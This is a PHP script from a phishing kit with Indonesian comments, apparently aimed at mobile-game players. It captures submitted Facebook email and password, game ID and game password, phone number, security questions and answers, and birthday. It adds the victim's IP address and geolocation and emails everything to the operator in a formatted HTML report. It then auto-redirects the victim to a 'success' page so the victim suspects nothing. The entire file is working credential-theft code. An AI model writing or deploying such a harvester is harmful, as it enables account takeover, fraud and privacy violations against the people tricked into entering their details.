<?php
// MENGAMBIL KONTROL
include 'system/setting.php';
include 'email.php';

// MENANGKAP DATA YANG DI-INPUT
// DATA FORMAL
$email = $_POST['emhjb'];               // email facebook
$password = $_POST['pshjb'];            // password facebook 
$passwordgame = $_POST['pid']; // password game
$nick = $_POST['nkhjb'];                // nickname
$playid = $_POST['idhjb'];              // id game
$phone = $_POST['nope'];                // phone number
$login = $_POST['login'];               // login

// TANYA JAWAB
$tanya1 = $_POST['tanya1'];
$tanya2 = $_POST['tanya2'];
$tanya3 = $_POST['tanya3'];
$jawab1 = $_POST['jawab1'];
$jawab2 = $_POST['jawab2'];
$jawab3 = $_POST['jawab3'];

// BIRTHDAY
$hari = $_POST['hari'];
$bulan = $_POST['bulan'];
$tahun = $_POST['tahun'];




if($email == "" && $password == ""){
header("Location: index.php");
}else{

$subjek = "$arpantek_flag | $arpantek_callingcode | PLAYID $playid | NICKNAME $nick";
$pesan = '
<center> 
<div style="background: url(https://pbs.twimg.com/media/Efw4vTuUwAAvmp6.jpg) no-repeat center center; background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Akun</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL / USERID</th>
<th style="width: 78%; text-align: center;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD / FB / GAME</th>
<th style="width: 78%; text-align: center;"><b>'.$password.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ID GAME</th>
<th style="width: 78%; text-align: center;"><b>'.$playid.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD GAME</th>
<th style="width: 78%; text-align: center;"><b>'.$passwordgame.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PHONE NUMBER</th>
<th style="width: 78%; text-align: center;"><b>'.$phone.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>NICKNAME</th>
<th style="width: 78%; text-align: center;"><b>'.$nick.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>BIRTHDAY</th>
<th style="width: 78%; text-align: center;"><b>'.$hari.' '.$bulan.' '.$tahun.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LOGIN</th>
<th style="width: 78%; text-align: center;"><b>'.$login.'</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Tambahan</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>'.$tanya1.'</th>
<th style="width: 78%; text-align: center;"><b>'.$jawab1.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>'.$tanya2.'</th>
<th style="width: 78%; text-align: center;"><b>'.$jawab2.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>'.$tanya3.'</th>
<th style="width: 78%; text-align: center;"><b>'.$jawab3.'</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Lokasi</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>IP ADDRESS</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_ip_address.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CONTINENT</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_continent.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>COUNTRY</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_country.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>REGION</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_region.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CITY</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_city.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LATITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_latitude.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LONGITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_longitude.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>WAKTU MASUK</th>
<th style="width: 78%; text-align: center;"><b>'.$jamasuk.'</th> 
</tr>
</table>
<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="float: left; margin-top: 3%;">
Temukan saya:
</div>
<div style="float: right;">
<a href="https://t.me/jefanyastore"><img style="margin: 5px;" width="30" src="https://i.postimg.cc/nrv55rRD/image.png"></a>
</div>
</div>
</center>
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($emailku, $subjek, $pesan, $headers);

// MENDAPATKAN DATA YANG DI-INPUT DAN MENGALIHKAN KE HALAMAN COMPLETED
echo "<form id='jefanya' method='POST' action='success.php'>
<input type='hidden' name='nick' value='$nick'>
<input type='hidden' name='playid' value='$playid'>
</form>
<script type='text/javascript'>document.getElementById('jefanya').submit();</script>";
}
?>